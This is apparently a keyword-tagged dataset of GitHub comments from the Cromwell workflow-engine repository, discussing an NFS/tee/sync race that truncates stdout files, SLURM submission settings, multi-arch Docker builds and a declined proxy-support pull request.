\; --mem=${memory_mb} \; --wrap ""singularity exec --containall --bind ${cwd}:${docker_cwd} docker://${docker} ${job_shell} ${docker_script}""; """"""; ```; But both options are way less than ideal and the choice of `60` might not be sufficient for all NFS configurations. If anybody wants to try to trigger this issue on an NFS shared filesystem setup, the following WDL should do the trick:; ```; version 1.0. workflow main {; scatter (idx in range(256)) {; call main {; input:; i = idx; }; }; output { Array[Int] n = main.n }; }. task main {; input {; Int i; }. command <<<; set -euo pipefail; echo ~{i*i}; >>>. output {; Int n = read_int(stdout()); }. runtime {; docker: ""debian:stable-slim""; }; }; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7094#issuecomment-1622071956
https://github.com/broadinstitute/cromwell/issues/7094#issuecomment-1622071956:1872,Modifiability,variab,variable,1872,"=""$$tmpDir""; |export HOME=""$home""; |(; |cd ${cwd.pathAsString}; |SCRIPT_PREAMBLE; |); |$out=""$${tmpDir}/out.$$$$"" $err=""$${tmpDir}/err.$$$$""; |mkfifo ""$$$out"" ""$$$err""; |trap 'rm ""$$$out"" ""$$$err""' EXIT; |touch $stdoutRedirection $stderrRedirection; |tee $stdoutRedirection < ""$$$out"" &; |tee $stderrRedirection < ""$$$err"" >&2 &; |(; |cd ${cwd.pathAsString}; |ENVIRONMENT_VARIABLES; |INSTANTIATED_COMMAND; |) $stdinRedirection > ""$$$out"" 2> ""$$$err""; |echo $$? > $rcTmpPath; |$emptyDirectoryFillCommand; |(; |cd ${cwd.pathAsString}; |SCRIPT_EPILOGUE; |${globScripts(globFiles)}; |${directoryScripts(directoryOutputs)}; |); |mv $rcTmpPath $rcPath; |"""""".stripMargin; .replace(""SCRIPT_PREAMBLE"", scriptPreamble); .replace(""ENVIRONMENT_VARIABLES"", environmentVariables); .replace(""INSTANTIATED_COMMAND"", commandString); .replace(""SCRIPT_EPILOGUE"", scriptEpilogue); .replace(""DOCKER_OUTPUT_DIR_LINK"", dockerOutputDir)); }; ```; With `SCRIPT_EPILOGUE` set to default to `sync` and modifiable with the `script-epilogue` variable in the configuration (this is not explained in the Cromwell documentation but it is explained [here](https://github.com/broadinstitute/cromwell/blob/8a1297fb0e44a11421eed98c5885188972337ce9/cromwell.example.backends/LocalExample.conf)). Maybe the problem could have been solved by also replacing `$stdoutRedirection` and `$stderrRedirection` with something like `$stdoutRedirectionTmp` and `$stderrRedirectionTmp` and then replace:; ```; mv $rcTmpPath $rcPath; ```; with:; ```; mv $stdoutRedirectionTmp $stdoutRedirection; mv $stderrRedirectionTmp $stderrRedirection; mv $rcTmpPath $rcPath; ```; This way `stdout` and `stderr` would have been created in the NFS filesystem at the same time as the `rc` file and would increase the likelihood that they would all have been synced at the same time. However, this would not give the intended behavior when running in Google Cloud. Another problem that I have noticed is that there are multiple places in the Cromwell documentation t",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7094#issuecomment-1622071956
https://github.com/broadinstitute/cromwell/issues/7094#issuecomment-1622071956:1888,Modifiability,config,configuration,1888,"=""$$tmpDir""; |export HOME=""$home""; |(; |cd ${cwd.pathAsString}; |SCRIPT_PREAMBLE; |); |$out=""$${tmpDir}/out.$$$$"" $err=""$${tmpDir}/err.$$$$""; |mkfifo ""$$$out"" ""$$$err""; |trap 'rm ""$$$out"" ""$$$err""' EXIT; |touch $stdoutRedirection $stderrRedirection; |tee $stdoutRedirection < ""$$$out"" &; |tee $stderrRedirection < ""$$$err"" >&2 &; |(; |cd ${cwd.pathAsString}; |ENVIRONMENT_VARIABLES; |INSTANTIATED_COMMAND; |) $stdinRedirection > ""$$$out"" 2> ""$$$err""; |echo $$? > $rcTmpPath; |$emptyDirectoryFillCommand; |(; |cd ${cwd.pathAsString}; |SCRIPT_EPILOGUE; |${globScripts(globFiles)}; |${directoryScripts(directoryOutputs)}; |); |mv $rcTmpPath $rcPath; |"""""".stripMargin; .replace(""SCRIPT_PREAMBLE"", scriptPreamble); .replace(""ENVIRONMENT_VARIABLES"", environmentVariables); .replace(""INSTANTIATED_COMMAND"", commandString); .replace(""SCRIPT_EPILOGUE"", scriptEpilogue); .replace(""DOCKER_OUTPUT_DIR_LINK"", dockerOutputDir)); }; ```; With `SCRIPT_EPILOGUE` set to default to `sync` and modifiable with the `script-epilogue` variable in the configuration (this is not explained in the Cromwell documentation but it is explained [here](https://github.com/broadinstitute/cromwell/blob/8a1297fb0e44a11421eed98c5885188972337ce9/cromwell.example.backends/LocalExample.conf)). Maybe the problem could have been solved by also replacing `$stdoutRedirection` and `$stderrRedirection` with something like `$stdoutRedirectionTmp` and `$stderrRedirectionTmp` and then replace:; ```; mv $rcTmpPath $rcPath; ```; with:; ```; mv $stdoutRedirectionTmp $stdoutRedirection; mv $stderrRedirectionTmp $stderrRedirection; mv $rcTmpPath $rcPath; ```; This way `stdout` and `stderr` would have been created in the NFS filesystem at the same time as the `rc` file and would increase the likelihood that they would all have been synced at the same time. However, this would not give the intended behavior when running in Google Cloud. Another problem that I have noticed is that there are multiple places in the Cromwell documentation t",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7094#issuecomment-1622071956
https://github.com/broadinstitute/cromwell/issues/7094#issuecomment-1622071956:2912,Modifiability,config,configurations,2912,"t-epilogue` variable in the configuration (this is not explained in the Cromwell documentation but it is explained [here](https://github.com/broadinstitute/cromwell/blob/8a1297fb0e44a11421eed98c5885188972337ce9/cromwell.example.backends/LocalExample.conf)). Maybe the problem could have been solved by also replacing `$stdoutRedirection` and `$stderrRedirection` with something like `$stdoutRedirectionTmp` and `$stderrRedirectionTmp` and then replace:; ```; mv $rcTmpPath $rcPath; ```; with:; ```; mv $stdoutRedirectionTmp $stdoutRedirection; mv $stderrRedirectionTmp $stderrRedirection; mv $rcTmpPath $rcPath; ```; This way `stdout` and `stderr` would have been created in the NFS filesystem at the same time as the `rc` file and would increase the likelihood that they would all have been synced at the same time. However, this would not give the intended behavior when running in Google Cloud. Another problem that I have noticed is that there are multiple places in the Cromwell documentation that advise, when running Cromwell with SLURM, to use configurations such as (see [here](https://cromwell.readthedocs.io/en/stable/tutorials/Containers/#configuration)):; ```; sbatch \; -o ${cwd}/execution/stdout \; -e ${cwd}/execution/stderr \; ```; or as (see [here](https://cromwell.readthedocs.io/en/stable/tutorials/HPCSlurmWithLocalScratch/#e-now-add-the-following-text-after-line-479-ie-after-the-line-reading-default-slurm-ensure-that-the-lines-that-show-line-breaks-in-this-document-are-in-fact-single-lines-in-referenceconf), or [here](https://cromwell.readthedocs.io/en/stable/backends/SLURM/), or [here](https://cromwell.readthedocs.io/en/stable/tutorials/HPCSlurmWithLocalScratch/#configure-the-execution-environment-for-cromwell), or [here](https://github.com/broadinstitute/cromwell/blob/8a1297fb0e44a11421eed98c5885188972337ce9/cromwell.example.backends/slurm.conf)); ```; sbatch \; -o ${out} \; -e ${err} \; ```; which overwrites `stdout` and `stderr` written by the `script` file, whic",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7094#issuecomment-1622071956
https://github.com/broadinstitute/cromwell/issues/7094#issuecomment-1622071956:3011,Modifiability,config,configuration,3011,"8972337ce9/cromwell.example.backends/LocalExample.conf)). Maybe the problem could have been solved by also replacing `$stdoutRedirection` and `$stderrRedirection` with something like `$stdoutRedirectionTmp` and `$stderrRedirectionTmp` and then replace:; ```; mv $rcTmpPath $rcPath; ```; with:; ```; mv $stdoutRedirectionTmp $stdoutRedirection; mv $stderrRedirectionTmp $stderrRedirection; mv $rcTmpPath $rcPath; ```; This way `stdout` and `stderr` would have been created in the NFS filesystem at the same time as the `rc` file and would increase the likelihood that they would all have been synced at the same time. However, this would not give the intended behavior when running in Google Cloud. Another problem that I have noticed is that there are multiple places in the Cromwell documentation that advise, when running Cromwell with SLURM, to use configurations such as (see [here](https://cromwell.readthedocs.io/en/stable/tutorials/Containers/#configuration)):; ```; sbatch \; -o ${cwd}/execution/stdout \; -e ${cwd}/execution/stderr \; ```; or as (see [here](https://cromwell.readthedocs.io/en/stable/tutorials/HPCSlurmWithLocalScratch/#e-now-add-the-following-text-after-line-479-ie-after-the-line-reading-default-slurm-ensure-that-the-lines-that-show-line-breaks-in-this-document-are-in-fact-single-lines-in-referenceconf), or [here](https://cromwell.readthedocs.io/en/stable/backends/SLURM/), or [here](https://cromwell.readthedocs.io/en/stable/tutorials/HPCSlurmWithLocalScratch/#configure-the-execution-environment-for-cromwell), or [here](https://github.com/broadinstitute/cromwell/blob/8a1297fb0e44a11421eed98c5885188972337ce9/cromwell.example.backends/slurm.conf)); ```; sbatch \; -o ${out} \; -e ${err} \; ```; which overwrites `stdout` and `stderr` written by the `script` file, which seems inappropriate. The following should have been used instead:; ```; sbatch \; -o ${out}.sbatch \; -e ${err}.sbatch \; ```; Similarly to how it is advised for [SGE](https://cromwell.readthedocs.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7094#issuecomment-1622071956
https://github.com/broadinstitute/cromwell/issues/7094#issuecomment-1622071956:3552,Modifiability,config,configure-the-execution-environment-for-cromwell,3552," time as the `rc` file and would increase the likelihood that they would all have been synced at the same time. However, this would not give the intended behavior when running in Google Cloud. Another problem that I have noticed is that there are multiple places in the Cromwell documentation that advise, when running Cromwell with SLURM, to use configurations such as (see [here](https://cromwell.readthedocs.io/en/stable/tutorials/Containers/#configuration)):; ```; sbatch \; -o ${cwd}/execution/stdout \; -e ${cwd}/execution/stderr \; ```; or as (see [here](https://cromwell.readthedocs.io/en/stable/tutorials/HPCSlurmWithLocalScratch/#e-now-add-the-following-text-after-line-479-ie-after-the-line-reading-default-slurm-ensure-that-the-lines-that-show-line-breaks-in-this-document-are-in-fact-single-lines-in-referenceconf), or [here](https://cromwell.readthedocs.io/en/stable/backends/SLURM/), or [here](https://cromwell.readthedocs.io/en/stable/tutorials/HPCSlurmWithLocalScratch/#configure-the-execution-environment-for-cromwell), or [here](https://github.com/broadinstitute/cromwell/blob/8a1297fb0e44a11421eed98c5885188972337ce9/cromwell.example.backends/slurm.conf)); ```; sbatch \; -o ${out} \; -e ${err} \; ```; which overwrites `stdout` and `stderr` written by the `script` file, which seems inappropriate. The following should have been used instead:; ```; sbatch \; -o ${out}.sbatch \; -e ${err}.sbatch \; ```; Similarly to how it is advised for [SGE](https://cromwell.readthedocs.io/en/stable/backends/SGE/) where `${out}.qsub` and `${err}.qsub` are used in place of `${out}` and `${err}`. The current workaround suggested by @honestAnt is instead to use in the Cromwell configuration file something like this:; ```; submit-docker = """"""; ...; sbatch \; --wait \; -J=${job_name} \; -D ${cwd} \; -o ${out}.sbatch \; -e ${err}.sbatch \; -t ${runtime_minutes} \; -c ${cpu} \; --mem=${memory_mb} \; --wrap ""singularity exec --containall --bind ${cwd}:${docker_cwd} docker://${docker} ${job_s",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7094#issuecomment-1622071956
https://github.com/broadinstitute/cromwell/issues/7094#issuecomment-1622071956:4251,Modifiability,config,configuration,4251,"-479-ie-after-the-line-reading-default-slurm-ensure-that-the-lines-that-show-line-breaks-in-this-document-are-in-fact-single-lines-in-referenceconf), or [here](https://cromwell.readthedocs.io/en/stable/backends/SLURM/), or [here](https://cromwell.readthedocs.io/en/stable/tutorials/HPCSlurmWithLocalScratch/#configure-the-execution-environment-for-cromwell), or [here](https://github.com/broadinstitute/cromwell/blob/8a1297fb0e44a11421eed98c5885188972337ce9/cromwell.example.backends/slurm.conf)); ```; sbatch \; -o ${out} \; -e ${err} \; ```; which overwrites `stdout` and `stderr` written by the `script` file, which seems inappropriate. The following should have been used instead:; ```; sbatch \; -o ${out}.sbatch \; -e ${err}.sbatch \; ```; Similarly to how it is advised for [SGE](https://cromwell.readthedocs.io/en/stable/backends/SGE/) where `${out}.qsub` and `${err}.qsub` are used in place of `${out}` and `${err}`. The current workaround suggested by @honestAnt is instead to use in the Cromwell configuration file something like this:; ```; submit-docker = """"""; ...; sbatch \; --wait \; -J=${job_name} \; -D ${cwd} \; -o ${out}.sbatch \; -e ${err}.sbatch \; -t ${runtime_minutes} \; -c ${cpu} \; --mem=${memory_mb} \; --wrap ""singularity exec --containall --bind ${cwd}:${docker_cwd} docker://${docker} ${job_shell} ${docker_script}""; mv ${cwd}/execution/rc ${cwd}/execution/rc.tmp; sleep 60; mv ${cwd}/execution/rc.tmp ${cwd}/execution/rc; """"""; ```; A better alternative would be to use in the Cromwell configuration file something like this (as suggested [here](https://github.com/broadinstitute/cromwell/blob/8a1297fb0e44a11421eed98c5885188972337ce9/src/ci/resources/local_provider_config.inc.conf)):; ```; script-epilogue = ""sleep 60 && sync"". submit-docker = """"""; ...; sbatch \; --wait \; -J=${job_name} \; -D ${cwd} \; -o ${out}.sbatch \; -e ${err}.sbatch \; -t ${runtime_minutes} \; -c ${cpu} \; --mem=${memory_mb} \; --wrap ""singularity exec --containall --bind ${cwd}:${docker_cw",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7094#issuecomment-1622071956
https://github.com/broadinstitute/cromwell/issues/7094#issuecomment-1622071956:4760,Modifiability,config,configuration,4760," \; -o ${out} \; -e ${err} \; ```; which overwrites `stdout` and `stderr` written by the `script` file, which seems inappropriate. The following should have been used instead:; ```; sbatch \; -o ${out}.sbatch \; -e ${err}.sbatch \; ```; Similarly to how it is advised for [SGE](https://cromwell.readthedocs.io/en/stable/backends/SGE/) where `${out}.qsub` and `${err}.qsub` are used in place of `${out}` and `${err}`. The current workaround suggested by @honestAnt is instead to use in the Cromwell configuration file something like this:; ```; submit-docker = """"""; ...; sbatch \; --wait \; -J=${job_name} \; -D ${cwd} \; -o ${out}.sbatch \; -e ${err}.sbatch \; -t ${runtime_minutes} \; -c ${cpu} \; --mem=${memory_mb} \; --wrap ""singularity exec --containall --bind ${cwd}:${docker_cwd} docker://${docker} ${job_shell} ${docker_script}""; mv ${cwd}/execution/rc ${cwd}/execution/rc.tmp; sleep 60; mv ${cwd}/execution/rc.tmp ${cwd}/execution/rc; """"""; ```; A better alternative would be to use in the Cromwell configuration file something like this (as suggested [here](https://github.com/broadinstitute/cromwell/blob/8a1297fb0e44a11421eed98c5885188972337ce9/src/ci/resources/local_provider_config.inc.conf)):; ```; script-epilogue = ""sleep 60 && sync"". submit-docker = """"""; ...; sbatch \; --wait \; -J=${job_name} \; -D ${cwd} \; -o ${out}.sbatch \; -e ${err}.sbatch \; -t ${runtime_minutes} \; -c ${cpu} \; --mem=${memory_mb} \; --wrap ""singularity exec --containall --bind ${cwd}:${docker_cwd} docker://${docker} ${job_shell} ${docker_script}""; """"""; ```; But both options are way less than ideal and the choice of `60` might not be sufficient for all NFS configurations. If anybody wants to try to trigger this issue on an NFS shared filesystem setup, the following WDL should do the trick:; ```; version 1.0. workflow main {; scatter (idx in range(256)) {; call main {; input:; i = idx; }; }; output { Array[Int] n = main.n }; }. task main {; input {; Int i; }. command <<<; set -euo pipefail; echo ~",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7094#issuecomment-1622071956
https://github.com/broadinstitute/cromwell/issues/7094#issuecomment-1622071956:5408,Modifiability,config,configurations,5408,"which seems inappropriate. The following should have been used instead:; ```; sbatch \; -o ${out}.sbatch \; -e ${err}.sbatch \; ```; Similarly to how it is advised for [SGE](https://cromwell.readthedocs.io/en/stable/backends/SGE/) where `${out}.qsub` and `${err}.qsub` are used in place of `${out}` and `${err}`. The current workaround suggested by @honestAnt is instead to use in the Cromwell configuration file something like this:; ```; submit-docker = """"""; ...; sbatch \; --wait \; -J=${job_name} \; -D ${cwd} \; -o ${out}.sbatch \; -e ${err}.sbatch \; -t ${runtime_minutes} \; -c ${cpu} \; --mem=${memory_mb} \; --wrap ""singularity exec --containall --bind ${cwd}:${docker_cwd} docker://${docker} ${job_shell} ${docker_script}""; mv ${cwd}/execution/rc ${cwd}/execution/rc.tmp; sleep 60; mv ${cwd}/execution/rc.tmp ${cwd}/execution/rc; """"""; ```; A better alternative would be to use in the Cromwell configuration file something like this (as suggested [here](https://github.com/broadinstitute/cromwell/blob/8a1297fb0e44a11421eed98c5885188972337ce9/src/ci/resources/local_provider_config.inc.conf)):; ```; script-epilogue = ""sleep 60 && sync"". submit-docker = """"""; ...; sbatch \; --wait \; -J=${job_name} \; -D ${cwd} \; -o ${out}.sbatch \; -e ${err}.sbatch \; -t ${runtime_minutes} \; -c ${cpu} \; --mem=${memory_mb} \; --wrap ""singularity exec --containall --bind ${cwd}:${docker_cwd} docker://${docker} ${job_shell} ${docker_script}""; """"""; ```; But both options are way less than ideal and the choice of `60` might not be sufficient for all NFS configurations. If anybody wants to try to trigger this issue on an NFS shared filesystem setup, the following WDL should do the trick:; ```; version 1.0. workflow main {; scatter (idx in range(256)) {; call main {; input:; i = idx; }; }; output { Array[Int] n = main.n }; }. task main {; input {; Int i; }. command <<<; set -euo pipefail; echo ~{i*i}; >>>. output {; Int n = read_int(stdout()); }. runtime {; docker: ""debian:stable-slim""; }; }; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7094#issuecomment-1622071956
https://github.com/broadinstitute/cromwell/issues/7094#issuecomment-1625987169:723,Integrability,synchroniz,synchronization,723,"After being able to do some testing with a collaborator that is able to reproduce the problem, I was able to gather that:; - `script-epilogue = ""sleep 5 && sync""` worked; - `script-epilogue = ""ls -l stdout stderr && sync""` worked; - `script-epilogue = ""ls && sync""` failed. with the `ls -l` suggestion coming from [here](https://stackoverflow.com/questions/3204835/ensure-that-file-state-on-the-client-is-in-sync-with-nfs-server). I am guessing here that `tee` might not be writing to stdout/stderr fast enough and by the time the `sync` command (which is what `script-epilogue` is set to default) is run, the stdout/stderr file might still be incomplete. So if I understand this correctly, while this is related to an NFS synchronization problem, it is not strictly an NFS synchronization problem but rather a synchronization problem between `tee` and `sync`",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7094#issuecomment-1625987169
https://github.com/broadinstitute/cromwell/issues/7094#issuecomment-1625987169:774,Integrability,synchroniz,synchronization,774,"After being able to do some testing with a collaborator that is able to reproduce the problem, I was able to gather that:; - `script-epilogue = ""sleep 5 && sync""` worked; - `script-epilogue = ""ls -l stdout stderr && sync""` worked; - `script-epilogue = ""ls && sync""` failed. with the `ls -l` suggestion coming from [here](https://stackoverflow.com/questions/3204835/ensure-that-file-state-on-the-client-is-in-sync-with-nfs-server). I am guessing here that `tee` might not be writing to stdout/stderr fast enough and by the time the `sync` command (which is what `script-epilogue` is set to default) is run, the stdout/stderr file might still be incomplete. So if I understand this correctly, while this is related to an NFS synchronization problem, it is not strictly an NFS synchronization problem but rather a synchronization problem between `tee` and `sync`",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7094#issuecomment-1625987169
https://github.com/broadinstitute/cromwell/issues/7094#issuecomment-1625987169:811,Integrability,synchroniz,synchronization,811,"After being able to do some testing with a collaborator that is able to reproduce the problem, I was able to gather that:; - `script-epilogue = ""sleep 5 && sync""` worked; - `script-epilogue = ""ls -l stdout stderr && sync""` worked; - `script-epilogue = ""ls && sync""` failed. with the `ls -l` suggestion coming from [here](https://stackoverflow.com/questions/3204835/ensure-that-file-state-on-the-client-is-in-sync-with-nfs-server). I am guessing here that `tee` might not be writing to stdout/stderr fast enough and by the time the `sync` command (which is what `script-epilogue` is set to default) is run, the stdout/stderr file might still be incomplete. So if I understand this correctly, while this is related to an NFS synchronization problem, it is not strictly an NFS synchronization problem but rather a synchronization problem between `tee` and `sync`",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7094#issuecomment-1625987169
https://github.com/broadinstitute/cromwell/issues/7094#issuecomment-1625987169:28,Testability,test,testing,28,"After being able to do some testing with a collaborator that is able to reproduce the problem, I was able to gather that:; - `script-epilogue = ""sleep 5 && sync""` worked; - `script-epilogue = ""ls -l stdout stderr && sync""` worked; - `script-epilogue = ""ls && sync""` failed. with the `ls -l` suggestion coming from [here](https://stackoverflow.com/questions/3204835/ensure-that-file-state-on-the-client-is-in-sync-with-nfs-server). I am guessing here that `tee` might not be writing to stdout/stderr fast enough and by the time the `sync` command (which is what `script-epilogue` is set to default) is run, the stdout/stderr file might still be incomplete. So if I understand this correctly, while this is related to an NFS synchronization problem, it is not strictly an NFS synchronization problem but rather a synchronization problem between `tee` and `sync`",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7094#issuecomment-1625987169
https://github.com/broadinstitute/cromwell/issues/7094#issuecomment-1710994350:160,Integrability,synchroniz,synchronize,160,"> ; `tee` will cache the standard output of the program into a buffer, after using `sync`, it will brush the data from the buffer to disk, after that, nfs will synchronize to the remote service (nfs itself has a delay of a few seconds); so no matter whether it is `tee` and `sync`, or nfs there may be a problem, the best thing is to turn the`rc.tmp` to` rc` file operation to give a delay of a few seconds is to do it in the case of not changing the source code. It's a good idea to delay the `rc.tmp` to `rc` file operation for a few seconds without changing the source code.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7094#issuecomment-1710994350
https://github.com/broadinstitute/cromwell/issues/7094#issuecomment-1710994350:15,Performance,cache,cache,15,"> ; `tee` will cache the standard output of the program into a buffer, after using `sync`, it will brush the data from the buffer to disk, after that, nfs will synchronize to the remote service (nfs itself has a delay of a few seconds); so no matter whether it is `tee` and `sync`, or nfs there may be a problem, the best thing is to turn the`rc.tmp` to` rc` file operation to give a delay of a few seconds is to do it in the case of not changing the source code. It's a good idea to delay the `rc.tmp` to `rc` file operation for a few seconds without changing the source code.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7094#issuecomment-1710994350
https://github.com/broadinstitute/cromwell/pull/7105#issuecomment-1514780146:73,Availability,down,down,73,"I know we've talked about it at length, but I don't know if it's written down anywhere - could you (either in the PR description or the ticket) lay out the WDL versions supported by Cromwell as of this PR, and what user-facing changes this PR introduces?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7105#issuecomment-1514780146
https://github.com/broadinstitute/cromwell/pull/7105#issuecomment-1553462820:91,Deployability,update,updated,91,"By the book, the customized branch names have to merge so that tests pass, and then can be updated in a follow-on PR.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7105#issuecomment-1553462820
https://github.com/broadinstitute/cromwell/pull/7105#issuecomment-1553462820:63,Testability,test,tests,63,"By the book, the customized branch names have to merge so that tests pass, and then can be updated in a follow-on PR.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7105#issuecomment-1553462820
https://github.com/broadinstitute/cromwell/pull/7105#issuecomment-1554621295:72,Modifiability,config,configured,72,"Cromwell is not one of the repos with the newfangled auto-delete branch configured, fortunately.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7105#issuecomment-1554621295
https://github.com/broadinstitute/cromwell/issues/7107#issuecomment-1496315700:29,Modifiability,plugin,plugin,29,It looks like our Docker SBT plugin recently added support for the required `buildx` command. https://github.com/marcuslonnberg/sbt-docker/pull/131,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7107#issuecomment-1496315700
https://github.com/broadinstitute/cromwell/issues/7107#issuecomment-1496701703:109,Availability,error,error,109,"I started a branch [here](https://github.com/broadinstitute/cromwell/tree/aen_arm64_build) but run into this error, which seems to be widespread on the 'net.; ```; docker exporter does not currently support exporting manifest lists; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7107#issuecomment-1496701703
https://github.com/broadinstitute/cromwell/issues/7107#issuecomment-1496729775:85,Availability,error,error,85,"Interestingly, I can get it to build for a single arch at once just fine [0] and the error is caused by lack of support for multiarch images somewhere in the local toolchain. [0] `platforms = List(""linux/arm64"")`",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7107#issuecomment-1496729775
https://github.com/broadinstitute/cromwell/issues/7108#issuecomment-1489453861:64,Modifiability,config,config,64,"Ah, I had `hasing-strategy` instead of `hashing-strategy` in my config.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7108#issuecomment-1489453861
https://github.com/broadinstitute/cromwell/issues/7108#issuecomment-1489453861:40,Security,hash,hashing-strategy,40,"Ah, I had `hasing-strategy` instead of `hashing-strategy` in my config.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7108#issuecomment-1489453861
https://github.com/broadinstitute/cromwell/issues/7109#issuecomment-1490324960:43,Modifiability,config,config,43,"Cromwell uses https://github.com/lightbend/config so if you can find support for that in the library, we can consider it.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7109#issuecomment-1490324960
https://github.com/broadinstitute/cromwell/issues/7109#issuecomment-1492729378:20,Modifiability,config,config,20,Does it matter what config library cromwell uses? Isn't this just. ```; for line in config:; if line not in expected_lines:; raise Warning; ```; and the trick is just deciding what your set of expected lines is?,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7109#issuecomment-1492729378
https://github.com/broadinstitute/cromwell/issues/7109#issuecomment-1492729378:84,Modifiability,config,config,84,Does it matter what config library cromwell uses? Isn't this just. ```; for line in config:; if line not in expected_lines:; raise Warning; ```; and the trick is just deciding what your set of expected lines is?,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7109#issuecomment-1492729378
https://github.com/broadinstitute/cromwell/pull/7114#issuecomment-1544673243:168,Testability,test,test,168,"Fair warning - in keeping with [my comment from February](https://github.com/broadinstitute/cromwell/issues/5006#issuecomment-1421492972), Cromwell does not support or test proxies, so there is no guarantee this PR will be a complete solution and/or that it will keep working.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7114#issuecomment-1544673243
https://github.com/broadinstitute/cromwell/pull/7114#issuecomment-1544787017:170,Testability,test,test,170,"> Fair warning - in keeping with [my comment from February](https://github.com/broadinstitute/cromwell/issues/5006#issuecomment-1421492972), Cromwell does not support or test proxies, so there is no guarantee this PR will be a complete solution and/or that it will keep working. Yes, I think it is understood that this is an option which originates from and is supported from outside the main Cromwell development effort.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7114#issuecomment-1544787017
https://github.com/broadinstitute/cromwell/pull/7114#issuecomment-1544923722:241,Security,access,access,241,"It's a bit more than that - there may be other parts of Cromwell that don't work with proxies. New such places may also appear unexpectedly due to non-testing. In other words, I strongly suggest trying to give Cromwell unrestricted Internet access first.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7114#issuecomment-1544923722
https://github.com/broadinstitute/cromwell/pull/7114#issuecomment-1544923722:151,Testability,test,testing,151,"It's a bit more than that - there may be other parts of Cromwell that don't work with proxies. New such places may also appear unexpectedly due to non-testing. In other words, I strongly suggest trying to give Cromwell unrestricted Internet access first.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7114#issuecomment-1544923722
https://github.com/broadinstitute/cromwell/pull/7114#issuecomment-1545803504:219,Deployability,configurat,configuration,219,"After discussing internally, we unfortunately can't add this code or support the general direction of proxy compatibility. Docker lookups and call caching are pretty sensitive and involved and we're looking to keep the configuration surface area to an absolute minimum.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7114#issuecomment-1545803504
